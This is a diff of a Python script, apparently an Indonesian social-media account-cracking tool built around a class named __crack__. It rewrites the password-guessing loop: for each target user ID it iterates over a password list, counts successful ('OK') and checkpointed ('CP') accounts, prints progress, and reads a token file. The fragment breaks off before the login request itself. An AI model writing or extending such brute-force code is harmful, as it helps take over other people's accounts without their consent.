@@ -660,24 +660,14 @@ class __crack__:
         return
 
     def __api__(self, user, __yan__):
-        loop += 1
-        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-        print('\r %s[Cracking] %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
+        global ok,cp,loop
+        rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
+        sys.stdout.write('\r [%s#%s] [Retakan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-def crack2(user, pwx):
-	global looping, loping
-	c_bff_ = len(pwx)
-	for pas in pwx:
-		if looping != 1:
-			pass
-		else:
-			if len(status_foll) != 1:
-				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
-				print "\r "+rm+"[->] %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
-				sys.stdout.flush()
-				c_bff_ -= 1
-			else:
-				pass
+        for pw in __yan__:
+            pw = pw.lower()
+            try: os.mkdir('results')
+            except: pass
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
